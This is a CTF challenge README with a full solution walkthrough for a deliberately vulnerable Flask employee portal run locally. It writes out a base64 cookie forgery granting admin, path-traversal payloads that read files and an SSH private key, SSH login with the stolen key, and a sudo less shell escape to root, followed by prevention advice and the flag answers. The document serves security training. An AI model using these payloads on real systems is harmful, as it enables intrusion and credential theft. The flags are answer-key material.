# Charlie - Cookie Tampering

**Status:** ✅ Complete

## Challenge Overview

| Field | Value |
|-------|-------|
| **Name** | Charlie - Cookie Tampering |
| **Type** | Web Application Security / Session Management / Privilege Escalation |
| **Difficulty** | Easy → Hard (progressive) |
| **Total Points** | 1,500 |
| **Flags** | 5 |
| **Port** | 4000 (HTTP), 2200 (SSH) |

## Description

EverSec's Employee Portal uses cookie-based session management. What could go wrong?

## Flags

| Flag | Points | Category | Skill |
|------|--------|----------|-------|
| FLAG 1 | 200 | Cookie Tampering | Base64 decode, JSON manipulation, directory enumeration |
| FLAG 2 | 100 | Data Exfiltration | Reading exported data carefully |
| FLAG 3 | 300 | Path Traversal | Directory traversal via export parameter |
| FLAG 4 | 400 | SSH Key Theft | Exfiltrating private keys, SSH access |
| FLAG 5 | 500 | Privilege Escalation | GTFOBins sudo exploitation |

## Setup

```bash
# Docker Compose (recommended)
docker compose up -d charlie-cookie-tampering

# Standalone
cd Challenges/charlie-cookie-tampering
docker build -t charlie-cookie-tampering .
docker run -p 4000:4000 -p 2200:22 charlie-cookie-tampering
```

Access the challenge at `http://localhost:4000`

## Solution

### FLAG 1: Cookie Tampering (200 pts)

**Objective**: Gain admin access by manipulating the session cookie.

1. Visit the login page at `http://localhost:4000/login`
2. View page source to find credentials in an HTML comment:
   ```html
   <!-- TODO: Remove before production deployment
        Dev credentials: employee / welcome123
   -->
   ```
3. Login with `employee` / `welcome123`
4. Open browser DevTools → Application → Cookies
5. Find the `session` cookie and decode it (base64):
   ```bash
   echo 'eyJ1c2VybmFtZSI6ICJlbXBsb3llZSIsICJyb2xlIjogImVtcGxveWVlIiwgImF1dGhlbnRpY2F0ZWQiOiB0cnVlfQ==' | base64 -d
   # {"username": "employee", "role": "employee", "authenticated": true}
   ```
6. Modify the role to `admin` and re-encode:
   ```bash
   echo -n '{"username":"employee","role":"admin","authenticated":true}' | base64
   # eyJ1c2VybmFtZSI6ImVtcGxveWVlIiwicm9sZSI6ImFkbWluIiwiYXV0aGVudGljYXRlZCI6dHJ1ZX0=
   ```
7. Set the new cookie value in DevTools
8. Navigate to `/admin` (not linked from dashboard — requires enumeration)
9. **FLAG 1**: `c00k13_t4mp3r1ng_1s_345y`

### FLAG 2: Data Exfiltration (100 pts)

**Objective**: Find the flag hidden in exported data.

1. On the admin panel, find the "Data Export" section
2. Download `quarterly_report.txt`
3. Read the report carefully — FLAG 2 is embedded in the "Security Audit & Compliance" section as a compliance reference code
4. **FLAG 2**: `3xp0rt_d4t4_l34k3d`

### FLAG 3: Path Traversal (300 pts)

**Objective**: Exploit path traversal in the export endpoint.

1. Notice the export URL format: `/admin/export?file=employees.csv`
2. The `file` parameter is vulnerable to directory traversal
3. Read a flag file outside the data directory:
   ```bash
   curl -b "session=<admin_cookie>" "http://localhost:4000/admin/export?file=../flag3.txt"
   ```
4. **FLAG 3**: `p4th_tr4v3rs4l_ftw`

**Alternative payloads**:
- `?file=../flag3.txt` (relative traversal)
- `?file=/app/flag3.txt` (absolute path — `os.path.join` replaces base when given absolute)
- `?file=....//flag3.txt` (double encoding variant)

### FLAG 4: SSH Key Theft (400 pts)

**Objective**: Steal an SSH private key and log into the server.

1. On the admin panel, the "Server Information" section reveals:
   - SSH Maintenance Port: 2200
   - Service Account: ctfuser
2. Use path traversal to read the SSH private key:
   ```bash
   curl -b "session=<admin_cookie>" "http://localhost:4000/admin/export?file=../../home/ctfuser/.ssh/id_rsa" > stolen_key
   chmod 600 stolen_key
   ```
3. SSH into the server:
   ```bash
   ssh -i stolen_key ctfuser@<host> -p 2200
   ```
4. Read the flag:
   ```bash
   cat ~/flag4.txt
   ```
5. **FLAG 4**: `ssh_k3y_th3ft`

### FLAG 5: Privilege Escalation (500 pts)

**Objective**: Escalate from ctfuser to root using a sudo misconfiguration.

1. Once SSH'd in, check sudo permissions:
   ```bash
   sudo -l
   # (root) NOPASSWD: /usr/bin/less
   ```
2. The `less` binary can be used to escape to a shell (GTFOBins):
   ```bash
   sudo /usr/bin/less /etc/profile
   ```
3. Inside `less`, type `!/bin/sh` and press Enter to drop into a root shell
4. Read the root flag:
   ```bash
   cat /root/flag5.txt
   ```
5. **FLAG 5**: `l3ss_1s_m0r3_r00t`

**Alternative**: Since the flag file is short, `sudo less /root/flag5.txt` will display it directly.

## Attack Chain

```
View source → Find credentials
    ↓
Login → Inspect cookie in DevTools
    ↓
Decode base64 → Modify role → Re-encode → Set cookie
    ↓
Enumerate /admin → FLAG 1 (admin panel access)
    ↓
Download quarterly report → FLAG 2 (hidden in data)
    ↓
Path traversal ?file=../flag3.txt → FLAG 3
    ↓
Path traversal to steal SSH key → SSH in → FLAG 4
    ↓
sudo -l → less NOPASSWD → !/bin/sh → root → FLAG 5
```

## Learning Objectives

1. **Source Code Review**: Always view page source for leaked credentials and comments
2. **Cookie Security**: Base64 encoding is NOT encryption — cookies need cryptographic signing (HMAC)
3. **Directory Enumeration**: Hidden endpoints like `/admin` won't be linked — enumerate them
4. **Path Traversal**: User-controlled file paths without sanitization lead to arbitrary file read
5. **SSH Key Management**: Private keys must never be accessible to web applications
6. **Linux Privilege Escalation**: GTFOBins documents sudo misconfigurations for common binaries
7. **Defense in Depth**: A single vulnerability chains into full system compromise

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1</summary>

Open browser developer tools and look at the session cookie set after login. The value looks like noise — but is it? What common encoding produces strings of letters, numbers, and `=` characters?

</details>

<details>
<summary>Hint 2</summary>

The admin export feature takes a file path as input. What happens when a path parameter isn't sanitized? What technique lets you escape from the intended directory?

</details>

<details>
<summary>Hint 3</summary>

The admin panel surfaces details about the server. Are there hints about other services running on this host? What sensitive files might an SSH-connected user have in their home directory?

</details>

<details>
<summary>Hint 4</summary>

Once you have SSH access, think like a pentester doing privilege escalation. The GTFOBins resource (gtfobins.github.io) catalogs ways common binaries can be abused — what does `sudo -l` reveal?

</details>

## Prevention

- **Sign cookies** with HMAC (e.g., Flask's `itsdangerous` or `flask.session`)
- **Validate file paths** by resolving and checking against an allowed base directory
- **Isolate SSH keys** from web-accessible directories
- **Audit sudo permissions** — never grant NOPASSWD to binaries with shell escape capabilities
- **Remove development credentials** before deployment
- **Use role-based access control** backed by server-side session storage, not client-side cookies

## Technical Details

- **Base Image**: python:3.11-slim (Debian)
- **Framework**: Flask 3.0.0
- **Services**: Flask (port 4000), OpenSSH (port 22/2200)
- **Privesc**: GTFOBins `less` via sudo NOPASSWD
- **User**: ctfuser (uid 1000)
